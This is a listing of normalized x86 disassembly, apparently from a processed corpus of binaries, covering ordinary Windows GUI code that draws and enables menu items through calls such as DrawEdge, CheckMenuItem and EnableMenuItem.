mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_41f8b4
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_42099c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_41c238
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_444778
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41ca04
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_447764
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x5c ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_41c504
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d1bc
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41cee4
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_444a68
jmp r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d1bc
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_41ccfc
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_41c238
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_403234
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_447764
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448bcb
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_446828
mov eax [ ebp + 0x8 ]
mov [ eax - 0x20 ] 0xa
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov edx [ ebp - 0x4 ]
call sub_41d01c
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ ebp - 0x4 ]
call sub_447764
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_448d18
push ebx
xor ebx ebx
mov edx [ eax + 0x64 ]
jmp r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
cmp [ edx + 0x7c ] 0x0
je r-xdata
call sub_4496fc
test eax eax
je r-xdata
mov ebx [ edx + 0x7c ]
jmp r-xdata
mov edx [ edx + 0x64 ]
mov eax ebx
pop ebx
retn
mov ebx [ eax + 0x48 ]
sub_448d48
push ebp
mov ebp esp
add esp 0xfffffeac
mov [ ebp - 0x154 ] 0x154
push 0x0
lea eax [ ebp - 0x154 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xbc ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xb8 ]
mov [ eax ] edx
sub_448d94
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov edi eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov si 0xfff2
call sub_403430
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
xor ebx ebx
mov bl 0x1
push ebp
call sub_448d48
pop ecx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x5
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffffe
xor eax eax
jmp r-xdata
mov eax edi
call sub_4496fc
mov esi eax
mov eax edi
call sub_448d18
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x30 ]
mov edx r-xdata
call sub_404378
jne r-xdata
cmp [ edi + 0x4c ] 0x0
je r-xdata
cmp [ edi + 0x40 ] 0xffffffff
jg r-xdata
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffff9
xor eax eax
mov eax [ edi + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x10
test bl bl
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
lea eax [ ebp - 0x20 ]
xor ecx ecx
mov edx 0x10
call sub_402c40
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax ] 0x3
mov eax [ ebp - 0x4 ]
add [ eax ] 0xf
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x10
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
xor ebx ebx
mov bl [ esi + 0x60 ]
jmp r-xdata
mov si [ edi + 0x60 ]
test si si
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_404004
lea edx [ ebp - 0x24 ]
mov eax esi
call sub_446828
mov ecx [ ebp - 0x24 ]
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_404278
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448f7d
lea eax [ ebp - 0x24 ]
call sub_403f6c
lea eax [ ebp - 0x10 ]
call sub_403f6c
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ edi + 0xa4 ]
call [ edi + 0xa0 ]
xor eax eax
mov al bl
mov ax [ eax * 2 + rw-data ]
or ax 0x40
or ax 0x20
or ax 0x100
or ax 0x400
movzx eax ax
lea edx [ ebp - 0x20 ]
push edx
push 0x0
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_447764
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
add eax 0x7
mov edx [ ebp - 0x4 ]
add [ edx ] eax
cmp [ edi + 0xa2 ] 0x0
je r-xdata
sub_448fa8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov edx esi
call sub_404378
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_403fc0
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_448fd0
push ebx
push esi
push edi
mov ebx eax
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_449140
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ eax + 0x3d ] 0x0
je r-xdata
mov edx edi
mov eax [ ebx + 0x64 ]
call sub_449150
cmp ebx eax
je r-xdata
mov dl [ eax + 0x3f ]
cmp dl [ ebx + 0x3f ]
jne r-xdata
xor edx edx
call sub_449018
sub_449018
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x38 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x38 ] bl
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
test bl bl
je r-xdata
test [ esi + 0x1c ] 0x2
jne r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_4476d4
push eax
call CheckMenuItem
mov eax esi
call sub_448fd0
sub_44906c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x39 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x39 ] bl
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov eax esi
call sub_449140
test eax eax
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
jmp r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
test [ esi + 0x1c ] 0x2
jne r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_4476d4
push eax
call EnableMenuItem
sub_4490e4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x3f ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov [ esi + 0x3f ] bl
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov edx esi
mov eax edi
call sub_4494a4
mov edx eax
mov ecx ebx
mov eax edi
call sub_447674
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov eax esi
call sub_448fd0
sub_449150
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_413840
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_44677c
sub_4491c0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_449140
test esi esi
jge r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax ebx
call sub_4491a8
cmp esi eax
je r-xdata
mov esi eax
dec esi
mov edi [ ebx + 0x64 ]
mov edx ebx
mov eax edi
call sub_4494d8
mov ecx ebx
mov edx esi
mov eax edi
call sub_4492cc
sub_449208
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_449140
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_449150
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_449260
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x3a ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ ebp + 0x3a ] bl
mov dl 0x1
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebp + 0x64 ] 0x0
je r-xdata
mov eax [ ebp + 0x64 ]
call sub_449140
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_449150
mov [ eax + 0x3a ] 0x0
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_449150
cmp [ eax + 0x3a ] 0x0
je r-xdata
sub_4492cc
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp [ esi + 0x64 ] 0x0
je r-xdata
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_44677c
mov ebp edi
dec ebp
test ebp ebp
jl r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebx + 0x5c ] eax
mov cl [ esi + 0x3f ]
mov edx edi
mov eax ebx
call sub_447674
mov ecx esi
mov edx edi
mov eax [ ebx + 0x5c ]
call sub_4138bc
mov [ esi + 0x64 ] ebx
mov [ esi + 0x84 ] ebx
mov [ esi + 0x80 ] sub_449544
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov eax [ ebx + 0x5c ]
cmp ebp [ eax + 0x8 ]
jge r-xdata
mov eax ebx
call sub_449140
dec eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4475a4
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_413840
mov al [ eax + 0x3f ]
cmp al [ esi + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_413840
mov dl [ eax + 0x3f ]
mov eax esi
call sub_4490e4
sub_449380
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_44677c
cmp [ ebx + 0x5c ] 0x0
je r-xdata
mov eax ebx
call sub_449140
test eax eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4475a4
mov eax ebx
call sub_449140
cmp esi eax
jl r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_413840
mov edi eax
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_413730
xor eax eax
mov [ edi + 0x64 ] eax
xor eax eax
mov [ edi + 0x80 ] eax
mov [ edi + 0x84 ] eax
cmp [ ebx + 0x34 ] 0x0
je r-xdata
sub_4493f4
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x39 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
jne r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
jne r-xdata
mov dl [ ebx + 0x38 ]
xor dl 0x1
mov eax ebx
call sub_449018
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_449128
test eax eax
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
je r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov eax ebx
call sub_449128
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x88 ]
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
mov edx ebx
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
jmp r-xdata
sub_4494bc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_449140
mov edx eax
mov ecx esi
mov eax ebx
call sub_4492cc
pop esi
pop ebx
retn
sub_4494d8
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4494a4
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edx esi
mov eax ebx
call sub_449380
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_44677c
sub_449500
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax esi
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
pop esi
pop ebx
retn
push ebx
mov ecx eax
mov edx esi
mov eax [ esi + 0x84 ]
call [ esi + 0x80 ]
xor eax eax
jmp r-xdata
cmp [ esi + 0x82 ] 0x0
je r-xdata
sub_449544
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
push 0x0
mov ecx esi
mov edx ebx
call sub_449544
jmp r-xdata
mov eax ebx
call sub_4475a4
cmp [ ebx + 0x6c ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
call sub_44b21c
sub_44959c
push ebx
mov ebx eax
cmp [ ebx + 0x4c ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ ebx + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov eax [ ebx + 0x4c ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_41f8b4
mov [ ebx + 0x4c ] eax
sub_4495c4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov eax [ ebx + 0x44 ]
call sub_403234
xor eax eax
mov [ ebx + 0x44 ] eax
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x44 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_449858
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_403430
mov edx ebx
mov eax edi
call sub_4192b0
mov eax ebx
mov si 0xffee
call sub_403430
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x44 ] eax
pop edi
pop esi
pop ebx
retn
sub_449634
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x4c ] 0x0
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_41f8b4
mov [ esi + 0x4c ] eax
sub_449668
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_449140
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_449150
mov edx [ eax ]
call [ edx + 0x40 ]
inc esi
dec ebx
jne r-xdata
sub_4496a8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_4494d8
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov eax [ esi + 0x34 ]
mov edx ebx
call sub_4494bc
jmp r-xdata
mov edx ebx
mov eax esi
call sub_4494bc
sub_44970c
push ebx
mov ebx eax
cmp dl [ ebx + 0x3d ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x3d ] dl
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebx + 0x3d ] 0x0
je r-xdata
mov eax ebx
call sub_448fd0
sub_449738
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov al [ edi + 0x95 ]
mov [ esi + 0xa8 ] al
cmp [ esi + 0xa8 ] 0x0
jne r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_448fa8
cmp [ esi + 0x30 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x69 ]
mov eax esi
call sub_449018
cmp [ esi + 0x38 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
call sub_44906c
cmp [ esi + 0x39 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x74 ]
mov [ esi + 0x54 ] eax
cmp [ esi + 0x54 ] 0x0
jne r-xdata
test bl bl
je r-xdata
lea eax [ esi + 0x58 ]
mov edx [ edi + 0x7c ]
call sub_403fc0
cmp [ esi + 0x58 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov edx [ edi + 0x80 ]
mov eax esi
call sub_449198
cmp [ esi + 0x40 ] 0xffffffff
jne r-xdata
mov dl [ edi + 0x6c ]
mov eax esi
call sub_4490e4
cmp [ esi + 0x3f ] 0x0
jne r-xdata
mov dx [ edi + 0x84 ]
mov eax esi
call sub_449174
cmp [ esi + 0x60 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_449188
cmp [ esi + 0x3e ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x88 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x8c ] eax
cmp [ esi + 0x8a ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_449858
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_449128
cmp edi eax
jne r-xdata
pop edi
pop esi
retn
xor ecx ecx
mov edx edi
mov eax esi
mov si 0xffef
call sub_403430
sub_44987c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44989c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4498bc
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4498dc
